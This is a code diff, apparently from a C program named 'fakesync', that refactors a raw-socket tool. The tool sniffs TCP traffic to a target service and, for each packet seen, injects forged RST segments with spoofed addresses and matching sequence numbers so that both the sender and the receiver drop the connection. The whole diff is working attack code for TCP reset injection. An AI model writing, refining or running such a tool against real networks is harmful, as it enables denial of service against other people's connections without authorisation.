@@ -31,7 +31,7 @@
 
 // Functions
 uint16_t ip_checksum(void*,size_t);
-void reset(const uint32_t, const uint32_t, 
+void reset(const int, const char *, const char *, const uint32_t, const uint32_t, 
     const uint16_t, const uint16_t, uint32_t, uint32_t);
 // void sigint_handler(int);
 void sigchld_handler(int);
@@ -46,16 +46,21 @@ struct pshdr {
 };
 
 int main(int argc, char *argv[]) {
-    int sniff_sock, count = 0, num, rv, yes = 1;
+    int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
     char service_ip[INET6_ADDRSTRLEN];
     uint16_t service_port;
     struct sockaddr_storage saddr;
     uint32_t service_addr;
     socklen_t addr_len;
+    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
     unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
     struct sigaction csa;
     struct iphdr *iph;
-    struct tcphdr *tcph;
+    struct tcphdr *tcph, *cstcph;
+    struct pshdr *psh;
+    uint16_t win = 8192, id0 = rand() %(65536);
+    size_t tcp_len;
+    struct sockaddr_in sa;
 
     csa.sa_handler = sigchld_handler; // reap all dead processes
 	sigemptyset(&csa.sa_mask);
@@ -86,7 +91,48 @@ int main(int argc, char *argv[]) {
 
     service_port = htons(service_port);
 
-    // Open raw socket
+    // open attack socket
+    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+        perror("fakesync: socket\n");
+        exit(-1);
+    }
+
+    // pre-fill TCP, IP and pseudo headers
+
+    // carve out IP header and TCP header
+    memset(datagram, 0, sizeof datagram);
+    iph = (struct iphdr *) datagram;
+    tcph = (struct tcphdr *) (iph + 1);
+
+    tcp_len = sizeof(struct tcphdr);
+
+    iph -> version = 4; // IPv4
+    iph -> ihl = 5; // 5 * 32 bits
+    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
+    iph -> id = htons(id0); // start ID
+    iph -> frag_off = 0x00;
+    iph -> ttl = 64; // time to live
+    iph -> protocol = IPPROTO_TCP; // TCP
+    
+    tcph -> doff = 5; // 5 * 32-bit tcp header
+    tcph -> ack = 0;
+    tcph -> rst = 1;
+    tcph -> window = htons(win); // 16 bits
+    tcph -> check = 0; // 16 bits. init to 0.
+    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
+
+    // construct psudo packet
+    memset(pseudo_packet, 0, sizeof pseudo_packet);
+    psh = (struct pshdr *) pseudo_packet;
+    cstcph = (struct tcphdr *) (psh + 1);
+    memcpy(cstcph, (char *)tcph, tcp_len);
+
+    // pack pseudo header
+    psh -> reserved = 0;
+    psh -> protocol = IPPROTO_TCP; // TCP
+    psh -> tcp_len = htons(tcp_len); // TCP segment length
+
+    // Open sniff socket
     if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
         perror("fakesync: socket\n");
         exit(-1);
@@ -112,13 +158,14 @@ int main(int argc, char *argv[]) {
             if (tcph -> rst == 1) goto final; // ignore reset packets
             // print_tcp_packet(buf, num); // log the packet
 
-            reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
-            reset(iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq), ntohl(tcph->seq)); // reset the sender
+            reset(attack_sock, &datagram, &pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
+            reset(attack_sock, &datagram, &pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq)+1, ntohl(tcph->seq)); // reset the sender
             goto final;
         }
     }
 
 final:
+    close(attack_sock);
     close(sniff_sock);
     return 0;
 }
@@ -166,66 +213,21 @@ uint16_t ip_checksum(void* vdata,size_t length) {
     return htons(~acc);
 }
 
-void reset(const uint32_t saddr, const uint32_t daddr, 
+void reset(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
 {
-    int attack_sock, num;
-    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
+    int num;
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    uint16_t win = 8192, id0 = rand() %(65536);
     size_t tcp_len;
     struct sockaddr_in sa;
 
-    // Open raw socket without protocol header
-    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("fakesync: socket\n");
-        exit(-1);
-    }
-
-    // carve out IP header and TCP header
-    memset(datagram, 0, sizeof datagram);
+    tcp_len = sizeof(struct tcphdr);
     iph = (struct iphdr *) datagram;
     tcph = (struct tcphdr *) (iph + 1);
-
-    tcp_len = sizeof(struct tcphdr);
-
-    // pack IP header
-    iph -> version = 4; // IPv4
-    iph -> ihl = 5; // 5 * 32 bits
-    iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
-    iph -> id = htons(id0); // start ID
-    iph -> frag_off = 0x00;
-    iph -> ttl = 64; // time to live
-    iph -> protocol = IPPROTO_TCP; // TCP
-    
-    // pack TCP header
-    // tcph -> res1 = 0;
-    // tcph -> res2 = 0;
-    tcph -> doff = 5; // 5 * 32-bit tcp header
-    // tcph -> urg = 0; // urgent flag
-    // tcph -> ack = 0;
-    // tcph -> psh = 0; // push data immediately
-    tcph -> rst = 1;
-    // tcph -> syn = 0;
-    // tcph -> fin = 0;
-    tcph -> window = htons(win); // 16 bits
-    tcph -> check = 0; // 16 bits. init to 0.
-    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
-
-    // construct psudo packet
-    memset(pseudo_packet, 0, sizeof pseudo_packet);
     psh = (struct pshdr *) pseudo_packet;
     cstcph = (struct tcphdr *) (psh + 1);
-    memcpy(cstcph, (char *)tcph, tcp_len);
-
-    // pack pseudo header
-    psh -> reserved = 0;
-    psh -> protocol = IPPROTO_TCP; // TCP
-    psh -> tcp_len = htons(tcp_len); // TCP segment length
-
-    sa.sin_family = AF_INET;
 
     // dynamic TCP fields
     tcph -> source = sport; // source port
@@ -245,6 +247,9 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     psh -> src_addr = saddr;
     psh -> dst_addr = daddr;
 
+    tcph -> check = 0;
+    cstcph -> check = 0;
+
     // calculate check sum
     tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); 
 
@@ -253,12 +258,11 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     iph -> daddr = daddr;
 
     // dynamic sockaddr field
+    sa.sin_family = AF_INET;
     sa.sin_addr.s_addr = daddr;
 
     if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
     {
         perror("fakesync: sendto()\n");
     }
-
-    close(attack_sock);
 }
